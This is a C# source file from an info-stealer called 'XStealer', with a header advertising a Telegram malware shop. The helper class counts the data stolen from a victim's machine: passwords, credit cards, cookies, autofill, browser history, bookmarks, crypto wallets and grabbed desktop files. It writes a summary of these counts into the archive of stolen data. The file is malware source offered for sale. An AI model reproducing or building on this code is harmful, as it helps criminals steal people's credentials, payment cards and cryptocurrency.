// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System.Collections.Generic;
    using System.IO;

    public static class CounterEx
    {
        public static string GetString(string text, int? value) => $"{text}: {value ?? 0}";
        public static string GetLValue(string application, List<string> value, char separator = '∟')
        {
            value.Sort(); return $"\n#{application.ToUpper()}:\n{separator} {string.Join($"\n{separator} ", value)} ";
            // return $"\n#{application.ToUpper()}:\n{separator} { string.Join($"\n{separator} ", value)} ";
            // return value.Count != 0 ? $"\n#{application.ToUpper()}:\n{separator} { string.Join($"\n{separator} ", value)} " : $"\n - {separator}{application} NOT FOUND";
        }
        public static string GetIValue(string application, int value) => $"{application}: {value}";

        public static int Passwords = 0; // счётчик паролей
        public static int CreditCards = 0; // счётчик кредиток
        public static int AutoFill = 0; // счётчик автозаполнения
        public static int Cookies = 0; // счётчик куков
        public static int History = 0; // счётчик истории
        public static int Bookmarks = 0; // счётчик закладок
        public static int Wallets = 0; // счётчик кошельков
        //public static int ExtraWallets = 0; // счётчик кошельков расширения браузеров
        public static int FilesGrab = 0; // счётчик файлов с рабочего стола

        /// <summary>
        /// Счётчик всех собранных данных в файл
        /// </summary>
        public static void Inizialize(string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
            try
            {
                using var file = new StreamWriter(ms);
                file.WriteLine("---Amount of data---\r\n");
                file.WriteLine(GetString("Passwords", Passwords));
                file.WriteLine(GetString("CreditCards", CreditCards));
                file.WriteLine(GetString("Cookies", Cookies));
                file.WriteLine(GetString("AutoFill", AutoFill));
                file.WriteLine(GetString("History", History));
                file.WriteLine(GetString("Bookmarks", Bookmarks));
                file.WriteLine(GetIValue("CryptoWallets", Wallets));
                // file.WriteLine(GetIValue("ExtraWallets", ExtraWallets));
                file.WriteLine(GetIValue("FileGrabbers", FilesGrab));
                file.Flush();
            }
            catch { }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
        }
    }
}